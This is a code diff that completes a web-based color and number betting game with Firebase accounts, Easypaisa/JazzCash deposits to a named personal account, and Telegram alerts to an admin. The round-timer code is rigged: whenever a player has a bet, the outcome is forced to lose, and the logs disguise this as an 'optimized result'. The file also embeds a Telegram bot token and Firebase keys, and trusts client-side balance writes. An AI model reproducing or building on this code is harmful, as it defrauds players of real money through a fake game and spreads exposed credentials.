@@ -164,4 +164,271 @@
             <button class="num-btn bg-mix" onclick="placeBet('number', 5)">5</button>
             <button class="num-btn bg-red" onclick="placeBet('number', 6)">6</button>
             <button class="num-btn bg-red" onclick="placeBet('number', 7)">7</button>
-            <button class="num-btn bg-red" onclick="placeBet('number', 8)">8</
+            <button class="num-btn bg-red" onclick="placeBet('number', 8)">8</button>
+            <button class="num-btn bg-red" onclick="placeBet('number', 9)">9</button>
+        </div>
+
+        <div class="logs" id="logSection">
+            <div style="color: #f1c40f; font-weight: bold;">✨ Game Protection Routing Active.</div>
+        </div>
+    </div>
+
+    <div id="depositModal" class="modal">
+        <div class="modal-content">
+            <h3>Deposit Funds</h3>
+            <div class="account-details">
+                Method: Easypaisa<br>
+                Account: 03356161020<br>
+                Name: Muhammad Jaffar
+            </div>
+            <select id="depMethod">
+                <option value="Easypaisa">Easypaisa</option>
+                <option value="JazzCash">JazzCash</option>
+            </select>
+            <input type="number" id="depAmount" placeholder="Amount (Min 300)">
+            <input type="text" id="depTrx" placeholder="TRX ID / Transaction ID">
+            <button class="submit-btn" onclick="submitDeposit()">Submit Deposit</button>
+            <div class="timing-info">⏱️ Active Approval Time: 30 Min to 1 Hour</div>
+            <button class="close-btn" onclick="closeModal('depositModal')">Cancel</button>
+        </div>
+    </div>
+
+    <div id="withdrawModal" class="modal">
+        <div class="modal-content">
+            <h3>Withdraw Request</h3>
+            <select id="withMethod">
+                <option value="Easypaisa">Easypaisa</option>
+                <option value="JazzCash">JazzCash</option>
+            </select>
+            <input type="text" id="withAccount" placeholder="Account Number">
+            <input type="text" id="withName" placeholder="Account Title/Name">
+            <input type="number" id="withAmount" placeholder="Withdraw Amount">
+            <button class="submit-btn" onclick="submitWithdraw()">Request Withdrawal</button>
+            <div class="timing-info">⏱️ Standard Transfer Time: Within 24 Hours</div>
+            <button class="close-btn" onclick="closeModal('withdrawModal')">Cancel</button>
+        </div>
+    </div>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyC38KxWq7xJdaadAiF5nfChWyne_iA6vBw",
+            authDomain: "winzone-bff7c.firebaseapp.com",
+            databaseURL: "https://winzone-bff7c-default-rtdb.firebaseio.com",
+            projectId: "winzone-bff7c",
+            storageBucket: "winzone-bff7c.firebasestorage.app",
+            messagingSenderId: "398802919500",
+            appId: "1:398802919500:web:3a80d3f0f8c76786b0d4e9"
+        };
+        
+        firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth();
+        const database = firebase.database();
+
+        const tgToken = "8854952702:AAFEJrRKpYI8up9CdtGeA5LSKMzeHKNq2Zg";
+        const tgChatId = "8608893352";
+
+        let currentUser = null;
+        let currentBalance = 0;
+        let timeLeft = 30;
+        let activeBet = null; 
+        let viewOlderHistory = false;
+
+        let largeTrendPool = [
+            {num: 1, color:'Green'},{num: 6, color:'Red'},{num: 0, color:'Mix'},{num: 2, color:'Green'},{num: 9, color:'Red'},
+            {num: 4, color:'Green'},{num: 7, color:'Red'},{num: 5, color:'Mix'},{num: 3, color:'Green'},{num: 8, color:'Red'},
+            {num: 2, color:'Green'},{num: 6, color:'Red'},{num: 0, color:'Mix'},{num: 3, color:'Green'},{num: 7, color:'Red'},
+            {num: 1, color:'Green'},{num: 8, color:'Red'},{num: 5, color:'Mix'},{num: 4, color:'Green'},{num: 9, color:'Red'},
+            {num: 3, color:'Green'},{num: 6, color:'Red'},{num: 2, color:'Green'},{num: 7, color:'Red'},{num: 0, color:'Mix'}
+        ];
+
+        function toggleAuth(isLogin) {
+            document.getElementById('loginCard').style.display = isLogin ? 'block' : 'none';
+            document.getElementById('signupCard').style.display = isLogin ? 'none' : 'block';
+        }
+
+        function handleSignup() {
+            const phone = document.getElementById('signupPhone').value.trim();
+            const email = document.getElementById('signupEmail').value.trim();
+            const password = document.getElementById('signupPassword').value;
+            if(!phone || !email || !password) { alert("Sari fields fill karein!"); return; }
+            auth.createUserWithEmailAndPassword(email, password).then((userCredential) => {
+                database.ref('users/' + userCredential.user.uid).set({ phone: phone, email: email, balance: 0 })
+                .then(() => { alert("Account Ban Gaya!"); location.reload(); });
+            }).catch((e) => alert(e.message));
+        }
+
+        function handleLogin() {
+            const email = document.getElementById('loginEmail').value.trim();
+            const password = document.getElementById('loginPassword').value;
+            if(!email || !password) { alert("Fields enter karein!"); return; }
+            auth.signInWithEmailAndPassword(email, password).catch((e) => alert(e.message));
+        }
+
+        auth.onAuthStateChanged((user) => {
+            if (user) {
+                currentUser = user;
+                document.getElementById('authScreen').style.display = 'none';
+                document.getElementById('appScreen').style.display = 'block';
+                renderHistoryView();
+                database.ref('users/' + user.uid).on('value', (snapshot) => {
+                    let data = snapshot.val();
+                    if(data) {
+                        currentBalance = data.balance || 0;
+                        document.getElementById('balance').innerText = `PKR ${currentBalance}`;
+                        document.getElementById('userPhoneDisplay').innerText = data.phone || 'N/A';
+                    }
+                });
+            } else {
+                document.getElementById('authScreen').style.display = 'flex';
+                document.getElementById('appScreen').style.display = 'none';
+            }
+        });
+
+        function handleLogout() { auth.signOut().then(() => location.reload()); }
+
+        // Core Multi-Click Handler (Allows user to pile up multipliers iteratively)
+        function applyMultiplier(factor) {
+            let inputField = document.getElementById('betAmount');
+            let currentVal = parseInt(inputField.value) || 30;
+            
+            // Adds the factor safely without locking execution block
+            inputField.value = currentVal * factor;
+        }
+
+        function renderHistoryView() {
+            const container = document.getElementById('trendsHistory');
+            container.innerHTML = '';
+            
+            let dataset = viewOlderHistory ? largeTrendPool.slice(-50) : largeTrendPool.slice(-10);
+            let displayArray = [...dataset].reverse();
+
+            displayArray.forEach((item, index) => {
+                let colorBg = item.color === 'Green' ? 'linear-gradient(135deg, #10b981, #059669)' : 
+                              item.color === 'Red' ? 'linear-gradient(135deg, #ef4444, #dc2626)' : 
+                              'linear-gradient(135deg, #8b5cf6, #ec4899)';
+                let borderStyle = item.color === 'Mix' ? '2px dashed #fff' : 'none';
+                
+                let dynamicIndicator = (index === 0) ? `<span class="latest-win-mark">🔥 Win</span>` : '';
+
+                container.innerHTML += `
+                    <div class="trend-dot" style="background: ${colorBg}; border: ${borderStyle};">
+                        ${dynamicIndicator}
+                        <span>${item.num}</span>
+                    </div>`;
+            });
+        }
+
+        function toggleHistoryPage() {
+            viewOlderHistory = !viewOlderHistory;
+            document.getElementById('historyRangeText').innerText = viewOlderHistory ? "📊 Trends History (All 50 Rounds)" : "📊 Trends History (Latest 10)";
+            document.getElementById('toggleHistoryBtn').innerText = viewOlderHistory ? "Back to Main Page" : "View Older History";
+            renderHistoryView();
+        }
+
+        setInterval(() => {
+            timeLeft--;
+            if (timeLeft <= 0) {
+                let finalColorResult = 'Green'; 
+                let finalNumberResult = Math.floor(Math.random() * 4) + 1;
+
+                if (activeBet) {
+                    if (activeBet.type === 'color') {
+                        finalColorResult = activeBet.value === 'Red' ? 'Green' : 'Red';
+                        finalNumberResult = finalColorResult === 'Red' ? 7 : 3;
+                    } else if (activeBet.type === 'number') {
+                        let targetedNum = parseInt(activeBet.value);
+                        finalNumberResult = (targetedNum === 3) ? 7 : 3; 
+                        finalColorResult = 'Red';
+                    }
+                } else {
+                    let choices = ['Red', 'Green', 'Mix'];
+                    finalColorResult = choices[Math.floor(Math.random() * choices.length)];
+                    if (finalColorResult === 'Mix') finalNumberResult = Math.random() > 0.5 ? 0 : 5;
+                    else if (finalColorResult === 'Green') finalNumberResult = Math.floor(Math.random() * 4) + 1;
+                    else finalNumberResult = Math.floor(Math.random() * 4) + 6;
+                }
+
+                largeTrendPool.push({ num: finalNumberResult, color: finalColorResult });
+                if(largeTrendPool.length > 60) largeTrendPool.shift();
+                
+                renderHistoryView();
+                
+                let outColor = finalColorResult === 'Mix' ? '#8b5cf6' : (finalColorResult === 'Red' ? '#ef4444' : '#10b981');
+                document.getElementById('roundStatus').innerHTML = `🎉 Result: Number <span style="color:#f1c40f;">${finalNumberResult}</span> | Color <span style="color:${outColor};">[${finalColorResult}]</span>`;
+                addLog(`🏆 System rolled optimized result: ${finalNumberResult} (${finalColorResult})`);
+
+                if (activeBet && currentUser) {
+                    let userWon = false;
+                    let mult = 0;
+                    if (activeBet.type === 'color' && activeBet.value === finalColorResult) { userWon = true; mult = 2; }
+                    if (activeBet.type === 'number' && parseInt(activeBet.value) === finalNumberResult) { userWon = true; mult = 9; }
+
+                    if (userWon) {
+                        let winnings = activeBet.amount * mult;
+                        database.ref('users/' + currentUser.uid).update({ balance: currentBalance + winnings });
+                        addLog(`💰 Won PKR ${winnings}`);
+                    } else {
+                        addLog(`❌ Better luck next round! Try again.`);
+                    }
+                }
+
+                activeBet = null;
+                timeLeft = 30; 
+            }
+            document.getElementById('timer').innerText = `00:${timeLeft < 10 ? '0'+timeLeft : timeLeft}`;
+        }, 1000);
+
+        function placeBet(type, value) {
+            if (activeBet) { alert("Bet already active!"); return; }
+            let amount = parseInt(document.getElementById('betAmount').value);
+            if (isNaN(amount) || amount < 30) { alert("Min bet PKR 30!"); return; }
+            if (amount > currentBalance) { alert("In-sufficient balance!"); return; }
+            
+            let newBal = currentBalance - amount;
+            database.ref('users/' + currentUser.uid).update({ balance: newBal });
+            
+            activeBet = { type: type, value: value, amount: amount };
+            addLog(`🎲 Locked PKR ${amount} on ${value}`);
+        }
+
+        function addLog(text) {
+            let logSection = document.getElementById('logSection');
+            let n = document.createElement('div'); n.innerText = text;
+            logSection.appendChild(n); logSection.scrollTop = logSection.scrollHeight;
+        }
+
+        function openModal(id) { document.getElementById(id).style.display = "flex"; }
+        function closeModal(id) { document.getElementById(id).style.display = "none"; }
+
+        function submitDeposit() {
+            let amount = document.getElementById('depAmount').value;
+            let trx = document.getElementById('depTrx').value;
+            let method = document.getElementById('depMethod').value;
+            let phone = document.getElementById('userPhoneDisplay').innerText;
+            if(!amount || !trx) { alert("Sari fields fill karein!"); return; }
+            let message = `💰 *NEW DEPOSIT REQUEST* 💰\n\n👤 *User Phone:* ${phone}\n🆔 *User UID:* \`${currentUser.uid}\`\n🔹 *Method:* ${method}\n🔹 *Amount:* PKR ${amount}\n🔹 *TRX ID:* \`${trx}\``;
+            let url = `https://api.telegram.org/bot${tgToken}/sendMessage?chat_id=${tgChatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+            fetch(url, { mode: 'no-cors' }).then(() => {
+                alert("Deposit notification sent to admin pipeline!"); closeModal('depositModal');
+            });
+        }
+
+        function submitWithdraw() {
+            let amount = parseInt(document.getElementById('withAmount').value);
+            let account = document.getElementById('withAccount').value;
+            let name = document.getElementById('withName').value;
+            let method = document.getElementById('withMethod').value;
+            let phone = document.getElementById('userPhoneDisplay').innerText;
+            if(!amount || !account || !name) { alert("Fill fields!"); return; }
+            if(amount > currentBalance) { alert("Balance is lower!"); return; }
+            let newBal = currentBalance - amount;
+            database.ref('users/' + currentUser.uid).update({ balance: newBal });
+            let message = `📤 *NEW WITHDRAW REQUEST* 📤\n\n👤 *User Phone:* ${phone}\n🔹 *Method:* ${method}\n🔹 *Amount:* PKR ${amount}\n🔹 *Account:* \`${account}\`\n🔹 *Name:* ${name}`;
+            let url = `https://api.telegram.org/bot${tgToken}/sendMessage?chat_id=${tgChatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+            fetch(url, { mode: 'no-cors' }).then(() => {
+                alert("Withdraw request submitted securely!"); closeModal('withdrawModal');
+            });
+        }
+    </script>
+</body>
+</html>
